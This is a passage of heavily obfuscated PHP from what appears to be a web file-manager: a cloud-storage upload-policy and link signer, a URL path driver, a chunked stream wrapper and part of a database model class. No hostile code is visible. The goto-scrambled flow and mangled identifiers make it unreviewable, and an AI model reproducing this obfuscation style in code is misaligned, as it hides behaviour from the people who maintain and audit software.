$GLOBALS[$aã´Ğ§Üô[7]][$aã´Ğ§Üô[78]]; return $this->uploadPolicy($cöì³Æ¡Ùç, $aæÊÏ™Œ©, $DØİßˆôôç); } private function uploadPolicy($a‡èË•Ô¶†, $E’à÷Ë…™‚ = 3600, $cÇÍôéÈïæ = 0) { goto aÑÀ†ë˜ÒÄ; cÌâ…†½Ö: $cÄ¼•‚ÃĞ = base64_encode(hash_hmac($BÃÃÌÏ¾İ[1354], "\120\x4f\x53\x54\46{$e¤¯Í„ä²ã}\x26{$aŞ¡ÃÖİø}\x26{$F±Ë¡›Òƒ‡}", md5("{$this->userpass}"), !0)); $F‡£¸Ãß = array($BÃÃÌÏ¾İ[1225] => $F±Ë¡›Òƒ‡, $BÃÃÌÏ¾İ[1388] => "\125\120\131\x55\116\40{$this->username}\72{$cÄ¼•‚ÃĞ}", $BÃÃÌÏ¾İ[175] => $this->endpoint . $e¤¯Í„ä²ã); return $F‡£¸Ãß; goto B•›è‹Ÿ ¨; aÑÀ†ë˜ÒÄ: $BÃÃÌÏ¾İ =& $_SERVER[›èö’ù¤]; $e¤¯Í„ä²ã = $BÃÃÌÏ¾İ[8] . $this->bucket; $aŞ¡ÃÖİø = gmdate($BÃÃÌÏ¾İ[1319]); goto bíºÜøŞÖñ; bíºÜøŞÖñ: $C´¡ÁÍß”º = array($BÃÃÌÏ¾İ[1384] => $this->bucket, $BÃÃÌÏ¾İ[1385] => $a‡èË•Ô¶†, $BÃÃÌÏ¾İ[1386] => time() + $E’à÷Ë…™‚, $BÃÃÌÏ¾İ[1387] => $aŞ¡ÃÖİø); if ($cÇÍôéÈïæ) { $C´¡ÁÍß”º[$BÃÃÌÏ¾İ[1299]] = $cÇÍôéÈïæ; } $F±Ë¡›Òƒ‡ = base64_encode(json_encode($C´¡ÁÍß”º)); goto cÌâ…†½Ö; B•›è‹Ÿ ¨: } public function download($B”ôÄ««Ò‚, $D¨½¿ƒ‘Ç‡) { goto A§¸¨…ñå§; bÄÇà”£¹„: fclose($eŠ’®»ˆƒÊ); return $D¨½¿ƒ‘Ç‡; goto fäàÈ˜ŒäÜ; B·ˆ²ÀÂ Ä: $aÇ’«Ì‘é† = 1024 * 200; $eŠ’®»ˆƒÊ = fopen($f—¡‡ ’Ç“, $_SERVER[›èö’ù¤][1338]); while (!0) { $E”‹§¯ªÑš = $this->fileSubstr($B”ôÄ««Ò‚, $c¸ïôŒ½Ñ¤, $aÇ’«Ì‘é†); if ($E”‹§¯ªÑš === !1) { return !1; } fwrite($eŠ’®»ˆƒÊ, $E”‹§¯ªÑš); $c¸ïôŒ½Ñ¤ += $aÇ’«Ì‘é†; if (strlen($E”‹§¯ªÑš) < $aÇ’«Ì‘é†) { break; } } goto bÄÇà”£¹„; A§¸¨…ñå§: $f—¡‡ ’Ç“ = IO::getPathInner(IO::mkfile($D¨½¿ƒ‘Ç‡)); if (!($DÖÜ³¥½ = $this->link($B”ôÄ««Ò‚))) { return !1; } $c¸ïôŒ½Ñ¤ = 0; goto B·ˆ²ÀÂ Ä; fäàÈ˜ŒäÜ: } public function link($d¸““ÚÑ§ê, $BÖìÀÎô‹¬ = array()) { $B¬êÚŞË =& $_SERVER[›èö’ù¤]; $d¸““ÚÑ§ê = trim($d¸““ÚÑ§ê, $B¬êÚŞË[8]); if (!empty($this->token)) { $eïèì×‡ß = strtotime(date($B¬êÚŞË[1389])); $f¢°„‰ÄîÜ = substr(md5($this->token . $B¬êÚŞË[282] . $eïèì×‡ß . $B¬êÚŞË[1390] . $d¸““ÚÑ§ê), 12, 8) . $eïèì×‡ß; $BÖìÀÎô‹¬[] = $B¬êÚŞË[1391] . $f¢°„‰ÄîÜ; } $b«»ªŠÆ¦¦ = !empty($BÖìÀÎô‹¬) ? $B¬êÚŞË[70] . implode($B¬êÚŞË[282], $BÖìÀÎô‹¬) : $B¬êÚŞË[33]; return $this->getHost() . $B¬êÚŞË[8] . $d¸““ÚÑ§ê . $b«»ªŠÆ¦¦; } public function fileOut($dÎĞÓ±‹Á, $DÇÒÖ¥´õÎ = false, $E–æä¨§ï = false, $E“¼ùÜÑî„ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dÎĞÓ±‹Á, $DÇÒÖ¥´õÎ, $E–æä¨§ï, $E“¼ùÜÑî„); } if (!$E–æä¨§ï) { $E–æä¨§ï = $this->pathThis($dÎĞÓ±‹Á); } $d‘»Ï¸Öñ¦ = $DÇÒÖ¥´õÎ ? array($_SERVER[›èö’ù¤][1392] . rawurlencode($E–æä¨§ï)) : array(); $e‰‡áµòÊ¦ = $this->link($dÎĞÓ±‹Á, $d‘»Ï¸Öñ¦); $this->fileOutLink($e‰‡áµòÊ¦); } public function fileOutServer($b„ÉøÓƒææ, $CˆË¥ïÀË˜ = false, $Bâ°‚à²Œ™ = false, $D•–…Øˆ„ = '') { parent::fileOut($b„ÉøÓƒææ, $CˆË¥ïÀË˜, $Bâ°‚à²Œ™, $D•–…Øˆ„); } public function fileOutImage($Aµ˜ÒÌåßÏ, $F¿¨Î“ãïà = 250) { $C•–èØšĞõ = $this->link($Aµ˜ÒÌåßÏ . $_SERVER[›èö’ù¤][1393] . $F¿¨Î“ãïà); $this->fileOutLink($C•–èØšĞõ); } public function fileOutImageServer($EØÉŸ¾Ë, $f…ë£ ä† = 250) { parent::fileOutImage($EØÉŸ¾Ë, $f…ë£ ä†); } public function hashMd5($C‚©‰–è¦—) { $CÂÖƒ¯¨†” =& $_SERVER[›èö’ù¤]; $dÒÚÖÆãçÃ = $this->_objectMeta($C‚©‰–è¦—); return isset($dÒÚÖÆãçÃ[$CÂÖƒ¯¨†”[208]]) ? $dÒÚÖÆãçÃ[$CÂÖƒ¯¨†”[208]] : !1; } public function size($B½Œ¦œÒÙ) { $cƒÍ±Ù‹í´ = $this->objectMeta($B½Œ¦œÒÙ); return $cƒÍ±Ù‹í´ ? $cƒÍ±Ù‹í´[$_SERVER[›èö’ù¤][78]] : 0; } public function info($DãÆŞš–Ë) { if ($this->isFolder($DãÆŞš–Ë)) { return $this->folderInfo($DãÆŞš–Ë); } else { if ($this->isFile($DãÆŞš–Ë)) { return $this->fileInfo($DãÆŞš–Ë); } } return !1; } public function exist($a™Åâ¥¤ï›) { return $this->isFile($a™Åâ¥¤ï›) || $this->isFolder($a™Åâ¥¤ï›); } public function isFile($b¦Â†ÌĞ‹ë) { return !$this->isFolder($b¦Â†ÌĞ‹ë) && $this->objectMeta($b¦Â†ÌĞ‹ë); } public function isFolder($e¬—™ë­¸«) { return $this->cacheMethod($_SERVER[›èö’ù¤][199], $e¬—™ë­¸«); } protected function objectMeta($Dèòî„˜×Ï) { return $this->cacheMethod($_SERVER[›èö’ù¤][200], $Dèòî„˜×Ï); } protected function _objectMeta($c‚«é°™ó) { goto eŒ¡¸£ëÂí; fß§ºÏ­Ş²: $E…ëÓù•Ñ = array($E‡ªõáé[29] => isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1395]]) ? $aÖ¨À¯’Ô‚[$E‡ªõáé[1395]] : null, $E‡ªõáé[78] => isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1396]]) ? $aÖ¨À¯’Ô‚[$E‡ªõáé[1396]] : null, $E‡ªõáé[208] => isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1397]]) ? $aÖ¨À¯’Ô‚[$E‡ªõáé[1397]] : null, $E‡ªõáé[1364] => isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1398]]) ? $aÖ¨À¯’Ô‚[$E‡ªõáé[1398]] : null); $E…ëÓù•Ñ[$E‡ªõáé[1365]] = isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1399]]) ? strtotime($aÖ¨À¯’Ô‚[$E‡ªõáé[1399]]) : $E…ëÓù•Ñ[$E‡ªõáé[1364]]; return $E…ëÓù•Ñ; goto AàŸ®Ù‰×ë; Cšöò”Ğé: if (!$D‹ËÀé¥Œ[$E‡ªõáé[1110]]) { return null; } $aÖ¨À¯’Ô‚ = isset($D‹ËÀé¥Œ[$E‡ªõáé[1112]]) ? $D‹ËÀé¥Œ[$E‡ªõáé[1112]] : array(); if (!isset($aÖ¨À¯’Ô‚[$E‡ªõáé[1395]])) { return null; } goto fß§ºÏ­Ş²; eŒ¡¸£ëÂí: $E‡ªõáé =& $_SERVER[›èö’ù¤]; if ($c‚«é°™ó == $E‡ªõáé[33] || $c‚«é°™ó == $E‡ªõáé[8]) { return array(); } $D‹ËÀé¥Œ = $this->ussRequest($c‚«é°™ó, $E‡ªõáé[1394]); goto Cšöò”Ğé; AàŸ®Ù‰×ë: } protected function _isFolder($Aâ¹Õšì¾) { $a©‡­Š¢²¢ =& $_SERVER[›èö’ù¤]; if ($Aâ¹Õšì¾ == $a©‡­Š¢²¢[33] || $Aâ¹Õšì¾ == $a©‡­Š¢²¢[8]) { return !0; } $e±ãíÜ¨œ = $this->_objectMeta($Aâ¹Õšì¾); return isset($e±ãíÜ¨œ[$a©‡­Š¢²¢[29]]) && $e±ãíÜ¨œ[$a©‡­Š¢²¢[29]] == $a©‡­Š¢²¢[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($b›‰ãĞ¬±” = false) { } public function exist($C†«­÷¥ó½) { $AæÉĞ¢äõ = $this->info($C†«­÷¥ó½); return $AæÉĞ¢äõ[$_SERVER[›èö’ù¤][195]]; } public function isFile($cô‰ÈĞŒÖ) { $FÕ£÷öÈ = $this->info($cô‰ÈĞŒÖ); return $FÕ£÷öÈ[$_SERVER[›èö’ù¤][195]]; } public function isFolder($DÜãŒœÓ) { return !1; } public function size($báÀ½‡øø¦) { $dËÙ¦Ä­‡„ = $this->info($báÀ½‡øø¦); return $dËÙ¦Ä­‡„[$_SERVER[›èö’ù¤][78]]; } public function info($F‚í›‹øà¦) { return $this->infoParse($F‚í›‹øà¦); } public function infoAuth($D¸‘›‹Ç›) { return $this->infoParse($D¸‘›‹Ç›); } public function infoWithChildren($eç¼Ä‚àÀ) { return $this->infoParse($eç¼Ä‚àÀ); } public function infoFull($aˆğŠ­‘íŒ) { return $this->infoParse($aˆğŠ­‘íŒ); } private function infoParse($F•ÖòòÍ—) { $cš¸ï¼¥ùª =& $_SERVER[›èö’ù¤]; $d³šÄÛéâ“ = $this->header($F•ÖòòÍ—); if (!$d³šÄÛéâ“ || !$d³šÄÛéâ“[$cš¸ï¼¥ùª[734]]) { return !1; } $Dà™šˆçòÓ = _get($d³šÄÛéâ“, $cš¸ï¼¥ùª[335], 0); $cÈ±““¼ö÷ = array($cš¸ï¼¥ùª[28] => $d³šÄÛéâ“[$cš¸ï¼¥ùª[28]], $cš¸ï¼¥ùª[76] => $F•ÖòòÍ—, $cš¸ï¼¥ùª[29] => $cš¸ï¼¥ùª[193], $cš¸ï¼¥ùª[78] => intval($Dà™šˆçòÓ), $cš¸ï¼¥ùª[168] => get_path_ext($d³šÄÛéâ“[$cš¸ï¼¥ùª[28]]), $cš¸ï¼¥ùª[1280] => $Dà™šˆçòÓ > 0 && $d³šÄÛéâ“[$cš¸ï¼¥ùª[1400]], $cš¸ï¼¥ùª[1281] => !1); return $cÈ±““¼ö÷; } private function header($c±ó‚òô‘Ç) { goto f‡ÄºÉç…; f³ñÓ£¢è˜: return self::$_cacheHeader[$c±ó‚òô‘Ç]; goto DéÊ‰‰á´»; f‡ÄºÉç…: $Aç­‘óİ‚Á =& $_SERVER[›èö’ù¤]; if (isset(self::$_cacheHeader[$c±ó‚òô‘Ç])) { return self::$_cacheHeader[$c±ó‚òô‘Ç]; } $DÒÙªå…ä = isset($GLOBALS[$Aç­‘óİ‚Á[1401]]) ? $GLOBALS[$Aç­‘óİ‚Á[1401]] : !1; goto b³¿ñŠ¥éï; b³¿ñŠ¥éï: $GLOBALS[$Aç­‘óİ‚Á[1401]] = !0; self::$_cacheHeader[$c±ó‚òô‘Ç] = url_header($c±ó‚òô‘Ç); $GLOBALS[$Aç­‘óİ‚Á[1401]] = $DÒÙªå…ä; goto f³ñÓ£¢è˜; DéÊ‰‰á´»: } public function hashSimple($c°†ˆß÷å, $A¢šìÄ·Á = false) { goto Cİõ‡è…‰; a©í†ÜàÈ·: $FÓº„­©˜ = $bÁ”÷¾ò“Á[$dÂ‹æË•Êø[78]]; $bÂŒÔÑ® = 200; $a«ß´’è = 50; goto d§ƒñ×‹›õ; Cİõ‡è…‰: $dÂ‹æË•Êø =& $_SERVER[›èö’ù¤]; $bÁ”÷¾ò“Á = $this->info($c°†ˆß÷å); if (!$bÁ”÷¾ò“Á || !$bÁ”÷¾ò“Á[$dÂ‹æË•Êø[195]]) { return !1; } goto a©í†ÜàÈ·; b•©åÔ”†: $DÚÂ¸…Óè .= $this->fileSubstr($c°†ˆß÷å, $FÓº„­©˜ - $bÂŒÔÑ®, $bÂŒÔÑ®); return md5($DÚÂ¸…Óè) . $FÓº„­©˜; goto C‡°½Ïƒ’; dòÑä”ô÷Ù: $aµÛ¦—°«– = timeFloat(); $a‘ùïŸ Ğå = 15; for ($e±İÆÊ§ø® = 0; $e±İÆÊ§ø® < $a«ß´’è; $e±İÆÊ§ø®++) { if (timeFloat() - $aµÛ¦—°«– > $a‘ùïŸ Ğå) { return !1; } $c˜ìŠ¡ñ£Š = $this->fileSubstr($c°†ˆß÷å, $Dù Çİ’„ * $e±İÆÊ§ø®, $bÂŒÔÑ®); if (!$c˜ìŠ¡ñ£Š) { return !1; } $DÚÂ¸…Óè .= $c˜ìŠ¡ñ£Š; } goto b•©åÔ”†; d§ƒñ×‹›õ: if ($FÓº„­©˜ <= $bÂŒÔÑ® * $a«ß´’è) { return md5($this->fileSubstr($c°†ˆß÷å, 0, $FÓº„­©˜)) . $FÓº„­©˜; } $Dù Çİ’„ = intval($FÓº„­©˜ / $a«ß´’è); $DÚÂ¸…Óè = $dÂ‹æË•Êø[33]; goto dòÑä”ô÷Ù; C‡°½Ïƒ’: } public function getContent($F¾áâ°ìê) { return $this->fileSubstr($F¾áâ°ìê); } public function fileSubstr($DÊ¬íø…‹À, $B¼ø»âÊ‹Ã = 0, $dîğ†…š = -1) { goto D‡ó¿¹ŞÀÔ; aÑ—ºƒÄƒ¤: $bÀ—Ù˜¬ = url_request($DÊ¬íø…‹À, $fŠ†ÒŒš½è[228], !1, $E‡›¸¡Ï„, !1, !1, 1); return $bÀ—Ù˜¬[$fŠ†ÒŒš½è[1112]] ? $bÀ—Ù˜¬[$fŠ†ÒŒš½è[1112]] : $fŠ†ÒŒš½è[33]; goto F£‹óÓàÕ; E­÷‚‹Ø‹Î: if ($dîğ†…š === -1) { $dîğ†…š = $fÒœË½…–[$fŠ†ÒŒš½è[78]]; } if ($dîğ†…š == 0) { return $fŠ†ÒŒš½è[33]; } $E‡›¸¡Ï„ = array($fŠ†ÒŒš½è[1402] . $B¼ø»âÊ‹Ã . $fŠ†ÒŒš½è[768] . ($B¼ø»âÊ‹Ã + $dîğ†…š - 1)); goto aÑ—ºƒÄƒ¤; D‡ó¿¹ŞÀÔ: $fŠ†ÒŒš½è =& $_SERVER[›èö’ù¤]; $fÒœË½…– = $this->info($DÊ¬íø…‹À); if (!$fÒœË½…– || !$fÒœË½…–[$fŠ†ÒŒš½è[195]] && $fÒœË½…–[$fŠ†ÒŒš½è[78]] > 1024 * 1024 * 10) { return !1; } goto E­÷‚‹Ø‹Î; F£‹óÓàÕ: } public function download($c¤¢áØÇê«, $b¹ºÌ¤åÁê) { Downloader::start($c¤¢áØÇê«, $b¹ºÌ¤åÁê); return $b¹ºÌ¤åÁê; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E˜²œ‡«ºô, $D™Ç‘ª†‡ = '') { goto d¸ŸÅÁ Ã; E¦ë°İÇ: $this->pathOpen = $E˜²œ‡«ºô; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto BììÀÚßœŒ; d¸ŸÅÁ Ã: $this->info = $this->info($E˜²œ‡«ºô); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[›èö’ù¤][76]]; goto E¦ë°İÇ; BììÀÚßœŒ: if (!isset(self::$_chunkBuffer[$E˜²œ‡«ºô])) { self::$_chunkBuffer[$E˜²œ‡«ºô] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto c„ò”“ß„¾; c„ò”“ß„¾: } function stream_read($C’Éõñì…Ÿ) { $EÈÔóë˜Ê = $this->fileSubstr($this->pose, $C’Éõñì…Ÿ); $this->pose += strlen($EÈÔóë˜Ê); return $EÈÔóë˜Ê; } public function stream_tell() { return $this->pose; } public function stream_seek($dİÄàôßêâ, $dñ“Ë©…¯) { $A‘ÊÍÁÀñƒ =& $_SERVER[›èö’ù¤]; if ($dñ“Ë©…¯ == SEEK_SET) { $this->pose = $dİÄàôßêâ; } else { if ($dñ“Ë©…¯ == SEEK_CUR) { $this->pose += $dİÄàôßêâ; } else { if ($dñ“Ë©…¯ == SEEK_END) { $this->pose = $this->info[$A‘ÊÍÁÀñƒ[78]] + intval($dİÄàôßêâ); } } } if ($dİÄàôßêâ < 0) { $this->pose = $this->info[$A‘ÊÍÁÀñƒ[78]] + $dİÄàôßêâ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[›èö’ù¤][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($A£¸¨“‰ºê, $eœÓ–ê‰ö¹) { $d¥»Ş„ŒÔ =& $_SERVER[›èö’ù¤]; $bÁƒÊ¥Õ‰ = $this->info($A£¸¨“‰ºê); return array($d¥»Ş„ŒÔ[1403] => 0, $d¥»Ş„ŒÔ[1404] => 0, $d¥»Ş„ŒÔ[12] => 32768 + 511, $d¥»Ş„ŒÔ[1405] => 0, $d¥»Ş„ŒÔ[1406] => 0, $d¥»Ş„ŒÔ[1407] => 0, $d¥»Ş„ŒÔ[1408] => 0, $d¥»Ş„ŒÔ[78] => $bÁƒÊ¥Õ‰[$d¥»Ş„ŒÔ[78]], $d¥»Ş„ŒÔ[1409] => $bÁƒÊ¥Õ‰[$d¥»Ş„ŒÔ[1279]], $d¥»Ş„ŒÔ[1365] => $bÁƒÊ¥Õ‰[$d¥»Ş„ŒÔ[84]], $d¥»Ş„ŒÔ[1364] => $bÁƒÊ¥Õ‰[$d¥»Ş„ŒÔ[194]], $d¥»Ş„ŒÔ[1410] => 0, $d¥»Ş„ŒÔ[1411] => 0); } static $fileInfo = array(); public function info($D”Ö˜˜„Á) { $AíçÃ•åŒ = $_SERVER[›èö’ù¤][1412]; if (isset(self::$fileInfo[$D”Ö˜˜„Á])) { return self::$fileInfo[$D”Ö˜˜„Á]; } if (substr($D”Ö˜˜„Á, 0, strlen($AíçÃ•åŒ)) != $AíçÃ•åŒ) { return !1; } self::$fileInfo[$D”Ö˜˜„Á] = IO::info(substr($D”Ö˜˜„Á, strlen($AíçÃ•åŒ))); return self::$fileInfo[$D”Ö˜˜„Á]; } public static function read($CäÎ÷ÊÛ», $bÛ™›øœ, $aïŸ â—Øî) { if (!isset(self::$_fopenCache[$CäÎ÷ÊÛ»])) { $EÄ‘¶Ø×ÌÆ = new StreamWrapperIO(); $EÄ‘¶Ø×ÌÆ->stream_open($CäÎ÷ÊÛ»); self::$_fopenCache[$CäÎ÷ÊÛ»] = $EÄ‘¶Ø×ÌÆ; } $EÄ‘¶Ø×ÌÆ = self::$_fopenCache[$CäÎ÷ÊÛ»]; return $EÄ‘¶Ø×ÌÆ->fileSubstr($bÛ™›øœ, $aïŸ â—Øî); } public static function _read($CóÕ‚¢È‘’, $b‚³÷Ñ†Éâ, $FÀÑÖÎÂ‰´) { goto c©ªò×ƒå ; c©ªò×ƒå : $e¦¨É¸šÔ =& $_SERVER[›èö’ù¤]; $AğâòƒâÄƒ = fopen($CóÕ‚¢È‘’, $e¦¨É¸šÔ[1283]); if (!$AğâòƒâÄƒ) { return $e¦¨É¸šÔ[33]; } goto eï»°º–Ê¥; eï»°º–Ê¥: $cƒ½¿ğ¬”Ø = 8192; fseek($AğâòƒâÄƒ, $b‚³÷Ñ†Éâ, SEEK_SET); $d„Œ‹àáØå = $e¦¨É¸šÔ[33]; goto aò‘ÉÁçƒÔ; aò‘ÉÁçƒÔ: $AÊ¬ö™±Ù» = 0; while ($AÊ¬ö™±Ù» < $FÀÑÖÎÂ‰´) { $d¶ùØ‚¨ª = min($cƒ½¿ğ¬”Ø, $FÀÑÖÎÂ‰´ - $AÊ¬ö™±Ù»); $d„Œ‹àáØå .= fread($AğâòƒâÄƒ, $d¶ùØ‚¨ª); $AÊ¬ö™±Ù» += $d¶ùØ‚¨ª; } fclose($AğâòƒâÄƒ); goto A¼•©ø„Ê; A¼•©ø„Ê: return $d„Œ‹àáØå; goto cœÂ¾ˆ·Ü´; cœÂ¾ˆ·Ü´: } public function fileSubstr($aÕ¥ãºí§Ø, $f¯‚ŠÖ’ˆ¸) { goto cĞğŠÅ¤„’; D‰®‡ñÚ‡: if ($aÕ¥ãºí§Ø + $f¯‚ŠÖ’ˆ¸ > $a›‚—¼†) { $f¯‚ŠÖ’ˆ¸ = $a›‚—¼† - $aÕ¥ãºí§Ø; } if ($f¯‚ŠÖ’ˆ¸ <= 0) { return $eœŞ­¿¬ô[33]; } if ($aÕ¥ãºí§Ø < 0 || $aÕ¥ãºí§Ø >= $a›‚—¼† || $f¯‚ŠÖ’ˆ¸ <= 0 || $f¯‚ŠÖ’ˆ¸ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\151\x6c\145\122\x65\141\x64\x20\x65\x72\162\157\x72\41\40\163\164\x61\162\x74\75{$aÕ¥ãºí§Ø}\x3b\154\x65\156\147\x74\x68\x3d{$f¯‚ŠÖ’ˆ¸}\x3b\40\x73\x69\172\x65\x3d{$a›‚—¼†}\73"); } goto aŸ¿ò‚ïîì; BÖ«àµ¬ò™: foreach ($C´Î­¼š§¤ as $C‰áÃ…½íš => $C¯†Ä‹¥ˆ‰) { $C‰áÃ…½íš = intval($C‰áÃ…½íš); $eìİëòŸé° = $C‰áÃ…½íš + strlen($C¯†Ä‹¥ˆ‰); if ($aÕ¥ãºí§Ø >= $eìİëòŸé°) { continue; } if ($aÕ¥ãºí§Ø >= $C‰áÃ…½íš && $aÕ¥ãºí§Ø + $f¯‚ŠÖ’ˆ¸ <= $eìİëòŸé°) { return substr($C¯†Ä‹¥ˆ‰, $aÕ¥ãºí§Ø - $C‰áÃ…½íš, $f¯‚ŠÖ’ˆ¸); } break; } if (count($C´Î­¼š§¤) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($eœŞ­¿¬ô[1413], $eœŞ­¿¬ô[1414] . count($C´Î­¼š§¤) . "\73\163\x74\141\x72\x74\75{$aÕ¥ãºí§Ø}\54\x6c\145\156\147\164\x68\x3d{$f¯‚ŠÖ’ˆ¸}\73\x70\x6f\x73\x65\72{$C‰áÃ…½íš}\x7e{$eìİëòŸé°}"); throw new Exception($eœŞ­¿¬ô[1415]); } $dÇÕãÁÛš = intval($aÕ¥ãºí§Ø / $a†ê‰™êó‚) * $a†ê‰™êó‚; goto d‡Ğ˜ÒƒÌ; B–˜’ÈŒêƒ: $DÃÒœ¤› = $f¯‚ŠÖ’ˆ¸; if ($aÕ¥ãºí§Ø < 0) { $aÕ¥ãºí§Ø = $a›‚—¼† + $aÕ¥ãºí§Ø; } if ($f¯‚ŠÖ’ˆ¸ === !1) { $f¯‚ŠÖ’ˆ¸ = $a›‚—¼† - $aÕ¥ãºí§Ø; } goto D‰®‡ñÚ‡; aŸ¿ò‚ïîì: $a†ê‰™êó‚ = 64 * 1024; $C´Î­¼š§¤ =& self::$_chunkBuffer[$this->path]; if (!$C´Î­¼š§¤) { $C´Î­¼š§¤ = array(); } goto C”œİèÀñÌ; EÉ‘Á‚«Íù: ksort($C´Î­¼š§¤); $EÉé¹®®‚Ü = substr($aôÚõ›ë¾É, $aÕ¥ãºí§Ø - $dÇÕãÁÛš, $f¯‚ŠÖ’ˆ¸); return $EÉé¹®®‚Ü; goto EÜÈÈîõÓ; cĞğŠÅ¤„’: $eœŞ­¿¬ô =& $_SERVER[›èö’ù¤]; $a›‚—¼† = $this->info[$eœŞ­¿¬ô[78]]; $Eéåµ‘±± = $aÕ¥ãºí§Ø; goto B–˜’ÈŒêƒ; d‡Ğ˜ÒƒÌ: $Cõ¸ìİÒó = ceil(($aÕ¥ãºí§Ø + $f¯‚ŠÖ’ˆ¸) / $a†ê‰™êó‚) * $a†ê‰™êó‚ - $dÇÕãÁÛš; $aôÚõ›ë¾É = IO::fileSubstr($this->path, $dÇÕãÁÛš, $Cõ¸ìİÒó); $C´Î­¼š§¤[$dÇÕãÁÛš . $eœŞ­¿¬ô[33]] = $aôÚõ›ë¾É; goto EÉ‘Á‚«Íù; C”œİèÀñÌ: $C‰áÃ…½íš = 0; $eìİëòŸé° = 0; $C¯†Ä‹¥ˆ‰ = $eœŞ­¿¬ô[33]; goto BÖ«àµ¬ò™; EÜÈÈîõÓ: } private function log($AÔÛİâ¡, $dÆÔÛ¤Ô¶Ê) { $F…µÁÚ…¡‰ =& $_SERVER[›èö’ù¤]; $cÈñŠ›¯ = timeFloat() - $this->timeStart; write_log(sprintf($F…µÁÚ…¡‰[1416], $AÔÛİâ¡, $this->info[$F…µÁÚ…¡‰[28]], $cÈñŠ›¯, $dÆÔÛ¤Ô¶Ê), $F…µÁÚ…¡‰[1102]); } } goto AÔ×÷ÙÏ­£; fİÇºÀÉ·: define($_SERVER[›èö’ù¤][240], 0); define($_SERVER[›èö’ù¤][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\162\x64\145\162", "\141\154\151\141\163", "\150\x61\166\x69\156\x67", "\x67\x72\157\165\160", "\x6c\x6f\143\x6b", "\x64\151\163\x74\151\x6e\x63\x74", "\141\x75\164\x6f", "\146\x69\x6c\x74\145\x72", "\x76\141\x6c\x69\144\x61\164\145", "\162\145\163\x75\154\x74", "\142\151\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($fÙ– Ò±ªí = '', $dÀ¸ÕÃ­êÒ = '', $cğÀçÇ½ìŒ = '') { $dçøí‰Ë‘ =& $_SERVER[›èö’ù¤]; $this->_initialize(); if (!empty($fÙ– Ò±ªí)) { if (strpos($fÙ– Ò±ªí, $dçøí‰Ë‘[95])) { list($this->dbName, $this->name) = explode($dçøí‰Ë‘[95], $fÙ– Ò±ªí); } else { $this->name = $fÙ– Ò±ªí; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($dÀ¸ÕÃ­êÒ)) { $this->tablePrefix = $dçøí‰Ë‘[33]; } elseif ($dçøí‰Ë‘[33] != $dÀ¸ÕÃ­êÒ) { $this->tablePrefix = $dÀ¸ÕÃ­êÒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($dçøí‰Ë‘[242]); } $this->db(0, empty($this->connection) ? $cğÀçÇ½ìŒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $A¨é™¥ìªÙ =& $_SERVER[›èö’ù¤]; if (empty($this->fields)) { if (think_config($A¨é™¥ìªÙ[243])) { $b ®ŠìÍƒ = $this->dbName ? $this->dbName : think_config($A¨é™¥ìªÙ[244]); $dÃÂ¡ÉÓÌÖ = think_var_cache($A¨é™¥ìªÙ[245] . strtolower(get_path_this($b ®ŠìÍƒ) . $A¨é™¥ìªÙ[95] . $this->name)); if ($dÃÂ¡ÉÓÌÖ) { $d¨ ŞŠ¼Ä¼ = think_config($A¨é™¥ìªÙ[246]); if (empty($d¨ ŞŠ¼Ä¼) || $dÃÂ¡ÉÓÌÖ[$A¨é™¥ìªÙ[247]] == $d¨ ŞŠ¼Ä¼) { $this->fields = $dÃÂ¡ÉÓÌÖ; return; } } } $this->flush(); } } public function flush() { goto BåãàŠ¿‘; BåãàŠ¿‘: $EÊ¯ã±µ¸Ñ =& $_SERVER[›èö’ù¤]; $this->db->setModel($this->name); $D±å­£×³‰ = $this->db->getFields($this->getTableName()); goto DÈŠÅ´ßë; b¢ŞÈš•–é: foreach ($D±å­£×³‰ as $C÷ØÃÜ¹â => $d®ôê¸«‰ñ) { $D°•éèà[$C÷ØÃÜ¹â] = $d®ôê¸«‰ñ[$EÊ¯ã±µ¸Ñ[29]]; if ($d®ôê¸«‰ñ[$EÊ¯ã±µ¸Ñ[36]]) { $this->fields[$EÊ¯ã±µ¸Ñ[249]] = $C÷ØÃÜ¹â; if ($d®ôê¸«‰ñ[$EÊ¯ã±µ¸Ñ[39]]) { $this->fields[$EÊ¯ã±µ¸Ñ[248]] = !0; } } } $this->fields[$EÊ¯ã±µ¸Ñ[250]] = $D°•éèà; if (think_config($EÊ¯ã±µ¸Ñ[246])) { $this->fields[$EÊ¯ã±µ¸Ñ[247]] = think_config($EÊ¯ã±µ¸Ñ[246]); } goto F¸‡Õ¬£Ë; F¸‡Õ¬£Ë: if (think_config($EÊ¯ã±µ¸Ñ[243])) { $bÜ…»‰ƒ = $this->dbName ? $this->dbName : think_config($EÊ¯ã±µ¸Ñ[244]); think_var_cache($EÊ¯ã±µ¸Ñ[245] . strtolower(get_path_this($bÜ…»‰ƒ) . 